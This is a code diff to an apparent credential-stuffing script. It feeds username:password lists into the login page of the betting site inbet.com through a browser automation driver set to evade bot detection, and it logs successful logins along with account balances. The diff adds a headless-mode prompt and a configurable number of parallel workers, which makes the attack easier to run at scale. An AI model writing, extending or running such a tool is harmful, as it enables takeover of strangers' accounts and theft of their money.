@@ -22,6 +22,7 @@ wrongpass_file = r"C:\Inbet\wrongpass.txt"
 init(autoreset=True)
 
 stop_flag = False
+HEADLESS_MODE = True  # will be set from user input in main()
 
 def log(message, level="INFO", username=None, password=None):
     color = {
@@ -89,13 +90,16 @@ def read_credentials(file_path):
     return [line.strip().split(':') for line in credentials]
 
 def init_driver(block_images=True):
+    # uses global HEADLESS_MODE
     options = uc.ChromeOptions()
     options.add_argument("--disable-extensions")
     options.add_argument("--disable-gpu")
     options.add_argument("--no-sandbox")
     options.add_argument("--log-level=3")
     options.add_argument("--disable-blink-features=AutomationControlled")
-    options.add_argument("--headless=new")
+
+    if HEADLESS_MODE:
+        options.add_argument("--headless=new")
 
     if block_images:
         prefs = {"profile.managed_default_content_settings.images": 2}
@@ -328,7 +332,7 @@ def login(credentials):
         driver.quit()
 
 def main():
-    global login_page_url, success_logins_file, stop_flag
+    global login_page_url, success_logins_file, stop_flag, HEADLESS_MODE
 
     credentials_file = 'unique.txt'
     success_logins_file = r"C:\Inbet\balance_and_bets_sounds.txt"
@@ -337,12 +341,39 @@ def main():
     login_page_url = "https://inbet.com/sports"
     credentials = read_credentials(credentials_file)
 
+    if not credentials:
+        log("No credentials found in file. Exiting.", "ERROR")
+        return
+
+    # ========= ASK HEADLESS OR NOT =========
+    headless_input = input("Run browser in headless mode? (y/n, default: y): ").strip().lower()
+    if headless_input == "n":
+        HEADLESS_MODE = False
+        log("Headless mode disabled. Browser windows will be visible.", "INFO")
+    else:
+        HEADLESS_MODE = True
+        log("Headless mode enabled.", "INFO")
+
+    # ========= ASK HOW MANY WORKERS =========
+    cpu_count = multiprocessing.cpu_count()
+    default_workers = min(9, cpu_count, len(credentials))
+    workers_input = input(
+        f"How many workers? (1-{len(credentials)}, default: {default_workers}): "
+    ).strip()
+
+    if workers_input.isdigit():
+        max_workers = int(workers_input)
+        if max_workers < 1:
+            max_workers = 1
+        if max_workers > len(credentials):
+            max_workers = len(credentials)
+    else:
+        max_workers = default_workers
+
+    log(f"Using {max_workers} workers (CPU cores: {cpu_count}).", "INFO")
+
     listener_thread = threading.Thread(target=emergency_stop_listener, daemon=True)
     listener_thread.start()
-
-    max_workers = 9
-    #max_workers = min(multiprocessing.cpu_count(), len(credentials))
-    print(f"[INFO] Starting with {max_workers} workers...")
 
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         executor.map(lambda cred: login(cred), credentials)
